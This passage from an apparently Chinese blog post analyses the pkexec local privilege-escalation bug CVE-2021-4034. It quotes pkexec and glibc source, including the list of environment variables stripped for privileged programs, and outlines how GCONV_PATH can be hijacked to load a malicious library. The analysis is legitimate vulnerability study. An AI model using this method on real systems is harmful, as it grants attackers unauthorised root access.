class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;--disable-internal-agent&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          opt_disable_internal_agent = TRUE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>90 行 n 是从 1 开始的<br>\n 120 行 break 是退出循环，说明是要执行的命令<br>\n后面部分</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">g_assert</span> (argv[argc] == <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">path = <span class=\"built_in\">g_strdup</span> (argv[n]);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (path == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">usage</span> (argc, argv);</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (path[<span class=\"number\">0</span>] != <span class=\"string\">&#x27;/&#x27;</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* g_find_program_in_path() is not suspectible to attacks via the environment */</span></span><br><span class=\"line\">    s = <span class=\"built_in\">g_find_program_in_path</span> (path);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (s == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;Cannot run program %s: %s\\n&quot;</span>, path, <span class=\"built_in\">strerror</span> (ENOENT));</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    <span class=\"built_in\">g_free</span> (path);</span><br><span class=\"line\">    path = s;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* argc&lt;2 and pkexec runs just shell, argv is guaranteed to be null-terminated.</span></span><br><span class=\"line\"><span class=\"comment\">     * /-less shell shouldn&#x27;t happen, but let&#x27;s be defensive and don&#x27;t write to null-termination</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argv[n] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      argv[n] = path;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>g_find_program_in_path (path)</code>  搜索命令的绝对路径</li>\n<li>绝对路径被回写回 <code>argv[n]</code></li>\n</ul>\n<p>对于命令行参数 <code>argv[]</code>  是在 <code>environ[]</code>  之后连着被压入的<br>\n命令行启动 <code>pkexec</code> ，第一个参数是自己 <code>&quot;pkexec&quot;</code> <br>\n 但是如果用 <code>execve</code>  启动，第一个就是 <code>NULL</code>  了，第二个就是环境变量 <code>environ[0]</code></p>\n<h3 id=\"dl坏事做尽\"><a class=\"markdownIt-Anchor\" href=\"#dl坏事做尽\">#</a> dl 坏事做尽</h3>\n<p>glibc2.27 ****/elf/dl-support.c : 307</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span></span><br><span class=\"line\">_dl_non_dynamic_init (<span class=\"type\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  ········</span><br><span class=\"line\">  ········</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__libc_enable_secure)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"type\">static</span> <span class=\"type\">const</span> <span class=\"type\">char</span> unsecure_envvars[] =</span><br><span class=\"line\">\tUNSECURE_ENVVARS</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> EXTRA_UNSECURE_ENVVARS</span></span><br><span class=\"line\">\tEXTRA_UNSECURE_ENVVARS</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\t;</span><br><span class=\"line\">      <span class=\"type\">const</span> <span class=\"type\">char</span> *cp = unsecure_envvars;</span><br><span class=\"line\">      <span class=\"comment\">// 清除不安全的环境变量</span></span><br><span class=\"line\">      <span class=\"keyword\">while</span> (cp &lt; unsecure_envvars + <span class=\"built_in\">sizeof</span> (unsecure_envvars))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  __unsetenv (cp);</span><br><span class=\"line\">\t  cp = (<span class=\"type\">const</span> <span class=\"type\">char</span> *) __rawmemchr (cp, <span class=\"string\">&#x27;\\0&#x27;</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> !HAVE_TUNABLES</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (__access (<span class=\"string\">&quot;/etc/suid-debug&quot;</span>, F_OK) != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t__unsetenv (<span class=\"string\">&quot;MALLOC_CHECK_&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> DL_PLATFORM_INIT</span></span><br><span class=\"line\">  DL_PLATFORM_INIT;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> DL_OSVERSION_INIT</span></span><br><span class=\"line\">  DL_OSVERSION_INIT;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  <span class=\"comment\">/* Now determine the length of the platform string.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (_dl_platform != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    _dl_platformlen = <span class=\"built_in\">strlen</span> (_dl_platform);</span><br><span class=\"line\">  <span class=\"comment\">/* Scan for a program header telling us the stack is nonexecutable.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (_dl_phdr != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">uint_fast16_t</span> i = <span class=\"number\">0</span>; i &lt; _dl_phnum; ++i)</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (_dl_phdr[i].p_type == PT_GNU_STACK)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  _dl_stack_flags = _dl_phdr[i].p_flags;</span><br><span class=\"line\">\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> DL_SYSINFO_IMPLEMENTATION</span></span><br><span class=\"line\">DL_SYSINFO_IMPLEMENTATION</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> ENABLE_STATIC_PIE</span></span><br><span class=\"line\"><span class=\"comment\">/* Since relocation to hidden _dl_main_map causes relocation overflow on</span></span><br><span class=\"line\"><span class=\"comment\">   aarch64, a function is used to get the address of _dl_main_map.  */</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">link_map</span> *</span><br><span class=\"line\">_dl_get_dl_main_map (<span class=\"type\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> &amp;_dl_main_map;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br></pre></td></tr></table></figure>\n<p>而 <code>UNSECURE_ENVVARS</code>  的变量是定义在 glibc-2.27/sysdeps/generic/unsecvars.h : 10</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> !HAVE_TUNABLES</span></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">define</span> GLIBC_TUNABLES_ENVVAR <span class=\"string\">&quot;GLIBC_TUNABLES\\0&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">define</span> GLIBC_TUNABLES_ENVVAR</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"comment\">/* Environment variable to be removed for SUID programs.  The names are</span></span><br><span class=\"line\"><span class=\"comment\">   all stuffed in a single string which means they have to be terminated</span></span><br><span class=\"line\"><span class=\"comment\">   with a &#x27;\\0&#x27; explicitly.  */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> UNSECURE_ENVVARS \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;GCONV_PATH\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;GETCONF_DIR\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  GLIBC_TUNABLES_ENVVAR\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;HOSTALIASES\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_AUDIT\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_DEBUG\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_DEBUG_OUTPUT\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_DYNAMIC_WEAK\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_HWCAP_MASK\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_LIBRARY_PATH\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_ORIGIN_PATH\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_PRELOAD\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_PROFILE\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_SHOW_AUXV\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_USE_LOAD_BIAS\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LOCALDOMAIN\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LOCPATH\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;MALLOC_TRACE\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;NIS_PATH\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;NLSPATH\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;RESOLV_HOST_CONF\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;RES_OPTIONS\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;TMPDIR\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;TZDIR\\0&quot;</span></span></span><br></pre></td></tr></table></figure>\n<p>当检测程序是特权文件的时候，会清空上面的环境变量<br>\n所以不能直接当环境变量传入<br>\n但这次我们有一次任意写机会<br>\n需要劫持环境变量引入我们的恶意库</p>\n<h3 id=\"劫持环境变量\"><a class=\"markdownIt-Anchor\" href=\"#劫持环境变量\">#</a> 劫持环境变量</h3>\n<p>利用的环境变量是 <code>GCONV_PATH</code> <br>\n<a href=\"https://trganda.github.io/posts/iconv/\">https://trganda.github.io/posts/iconv/</a></p>\n<blockquote>\n<p>In <a href=\"https://www.gnu.org/software/libc/manual/html_node/Generic-Conversion-Interface.html\">glib</a>, a module named iconv support convert a charset to another. And the conversion was implemented in such dynamic library (gconv module) which implement pre-request <a href=\"https://www.gnu.org/software/libc/manual/html_node/glibc-iconv-Implementation.html#6.5.4.4%20iconv%20module%20interfaces\">interface</a>, the usage of these gconv module were defined in a configuration file with name gconv-modules.</p>\n</blockquote>\n<ul>\n<li><code>iconv</code>  转换字符集</li>\n<li><code>iconv</code>  是在一个动态库 <code>gconv module</code></li>\n<li>动态库 <code>gconv module</code>  定义在配置文件夹 <code>gconv-modules</code>  里</li>\n<li>会调用这个文件夹 <code>gconv-modules</code>  下的 <code>so</code>  文件中的 <code>gconv()</code>  和 <code>gconv_init()</code></li>\n</ul>\n<p>The default  <code>gconv module</code>  and  <code>gconv module configuration</code>  file was located in:</p>\n<ul>\n<li>/usr/lib/gconv: Usual default gconv module path.</li>\n<li>/usr/lib/gconv/gconv-modules: Usual system default gconv module configuration file.</li>\n<li>/usr/lib/gconv/gconv-modules.cache: Usual system gconv module configuration cache</li>\n</ul>\n<p>可以看看 iconv 的 help</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/Desktop/cve/CVE-2021-4034/poc$ iconv --help</span><br><span class=\"line\">Usage: iconv [OPTION...] [FILE...]</span><br><span class=\"line\">Convert encoding of given files from one encoding to another.</span><br><span class=\"line\"></span><br><span class=\"line\"> Input/Output format specification:</span><br><span class=\"line\">  -f, --from-code=NAME       encoding of original text</span><br><span class=\"line\">  -t, --to-code=NAME         encoding for output</span><br><span class=\"line\"></span><br><span class=\"line\"> Information:</span><br><span class=\"line\">  -l, --list                 list all known coded character sets</span><br><span class=\"line\"></span><br><span class=\"line\"> Output control:</span><br><span class=\"line\">  -c                         omit invalid characters from output</span><br><span class=\"line\">  -o, --output=FILE          output file</span><br><span class=\"line\">  -s, --silent               suppress warnings</span><br><span class=\"line\">      --verbose              print progress information</span><br><span class=\"line\"></span><br><span class=\"line\">  -?, --help                 Give this help list</span><br><span class=\"line\">      --usage                Give a short usage message</span><br><span class=\"line\">  -V, --version              Print program version</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>使用</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iconv -f UTF-8 -t UTF-16 &lt; input file &gt; output file</span><br></pre></td></tr></table></figure>\n<p><code>iconv</code>  会调用 <code>iconv_open()</code>  而 <code>iconv_open()</code>  依赖环境变量 <code>GCONV_PATH</code></p>\n<blockquote>\n<p>The iconv support extension the charset conversion ability by user defined gconv module. When use iconv or call iconv() function, it must first allocate a conversion descriptor using <a href=\"https://man7.org/linux/man-pages/man3/iconv_open.3.html\">iconv_open()</a>. The operation of this function will influence by the enviroment GCONV_PATH</p>\n</blockquote>\n<p><em><strong>此处应该有源码，之后补</strong></em><br>\n用 <code>GCONV_PATH</code>  指定自定义模块去替换系统模块<br>\n所以利用方法如下</p>\n<blockquote>\n<p>Suppose we can control the content of enviroment GCONV_PATH, provide a gconv module configuration file and gconv module with evil code. The evil code may be execute for some case.</p>\n</blockquote>\n<p><a href=\"https://www.gnu.org/software/libc/manual/html_node/glibc-iconv-Implementation.html#6.5.4.1%20Format%20of%20gconv-modules%20files\">gconv 格式</a></p>\n<h3 id=\"关于argv和environ\"><a class=\"markdownIt-Anchor\" href=\"#关于argv和environ\">#</a> 关于 argv 和 environ</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">environ</span></span><br><span class=\"line\">00:0000│ rdx 0x7fffffffe018 —▸ 0x7fffffffe374 ◂— &#x27;SHELL=/bin/bash&#x27;</span><br><span class=\"line\">01:0008│     0x7fffffffe020 —▸ 0x7fffffffe384 ◂— &#x27;SESSION_MANAGER=local/squ-virtual-machine:@/tmp/.ICE-unix/1566,unix/squ-virtual-machine:/tmp/.ICE-unix/1566&#x27;</span><br><span class=\"line\">02:0010│     0x7fffffffe028 —▸ 0x7fffffffe3f0 ◂— &#x27;QT_ACCESSIBILITY=1&#x27;</span><br><span class=\"line\">03:0018│     0x7fffffffe030 —▸ 0x7fffffffe403 ◂— &#x27;COLORTERM=truecolor&#x27;</span><br><span class=\"line\">04:0020│     0x7fffffffe038 —▸ 0x7fffffffe417 ◂— &#x27;XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg&#x27;</span><br><span class=\"line\">05:0028│     0x7fffffffe040 —▸ 0x7fffffffe444 ◂— &#x27;XDG_MENU_PREFIX=gnome-&#x27;</span><br><span class=\"line\">06:0030│     0x7fffffffe048 —▸ 0x7fffffffe45b ◂— &#x27;GNOME_DESKTOP_SESSION_ID=this-is-deprecated&#x27;</span><br><span class=\"line\">07:0038│     0x7fffffffe050 —▸ 0x7fffffffe487 ◂— &#x27;LC_ADDRESS=zh_CN.UTF-8&#x27;</span><br><span class=\"line\">08:0040│     0x7fffffffe058 —▸ 0x7fffffffe49e ◂— &#x27;GNOME_SHELL_SESSION_MODE=ubuntu&#x27;</span><br><span class=\"line\">09:0048│     0x7fffffffe060 —▸ 0x7fffffffe4be ◂— &#x27;LC_NAME=zh_CN.UTF-8&#x27;</span><br><span class=\"line\">0a:0050│     0x7fffffffe068 —▸ 0x7fffffffe4d2 ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span><br><span class=\"line\">0b:0058│     0x7fffffffe070 —▸ 0x7fffffffe4fb ◂— &#x27;XMODIFIERS=@im=ibus&#x27;</span><br><span class=\"line\">0c:0060│     0x7fffffffe078 —▸ 0x7fffffffe50f ◂— &#x27;DESKTOP_SESSION=ubuntu&#x27;</span><br><span class=\"line\">0d:0068│     0x7fffffffe080 —▸ 0x7fffffffe526 ◂— &#x27;LC_MONETARY=zh_CN.UTF-8&#x27;</span><br><span class=\"line\">0e:0070│     0x7fffffffe088 —▸ 0x7fffffffe53e ◂— &#x27;SSH_AGENT_PID=1528&#x27;</span><br><span class=\"line\">0f:0078│     0x7fffffffe090 —▸ 0x7fffffffe551 ◂— &#x27;GTK_MODULES=gail:atk-bridge&#x27;</span><br><span class=\"line\">10:0080│     0x7fffffffe098 —▸ 0x7fffffffe56d ◂— &#x27;PWD=/home/squ/Desktop&#x27;</span><br><span class=\"line\">11:0088│     0x7fffffffe0a0 —▸ 0x7fffffffe583 ◂— &#x27;XDG_SESSION_DESKTOP=ubuntu&#x27;</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">argv</span></span><br><span class=\"line\">00:0000│ rsi 0x7fffffffe008 —▸ 0x7fffffffe35c ◂— &#x27;/home/squ/Desktop/a.out&#x27;</span><br><span class=\"line\">01:0008│     0x7fffffffe010 ◂— 0x0</span><br></pre></td></tr></table></figure>\n<p><code>argv</code>  的第一个参数是自己的绝对路径，第二个参数是 <code>NULL</code></p>\n<h4 id=\"execvec\"><a class=\"markdownIt-Anchor\" href=\"#execvec\">#</a> execve.c</h4>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span>* <span class=\"type\">const</span> argv[] = &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;AAAA1111&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;BBBB2222&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;CCCC3333&quot;</span>,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"type\">char</span>* <span class=\"type\">const</span> envp[] = &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;DDDD3333&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;EEEE4444&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;FFFF5555&quot;</span>,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">execve</span>(<span class=\"string\">&quot;./test&quot;</span>, argv, envp);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"testc\"><a class=\"markdownIt-Anchor\" href=\"#testc\">#</a> test.c</h4>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>** argv)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;argc: %d\\n&quot;</span>, argc);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i; i&lt;<span class=\"number\">8</span>; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(argv[i]!=<span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;argv[%d]: %s\\n&quot;</span>, i, argv[i]);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;argv[%d]: NULL\\n&quot;</span>, i);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"结果\"><a class=\"markdownIt-Anchor\" href=\"#结果\">#</a> 结果</h4>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-<span class=\"keyword\">virtual</span>-machine:~/Desktop$ ./execve </span><br><span class=\"line\">argc: <span class=\"number\">3</span></span><br><span class=\"line\">argv[<span class=\"number\">0</span>]: 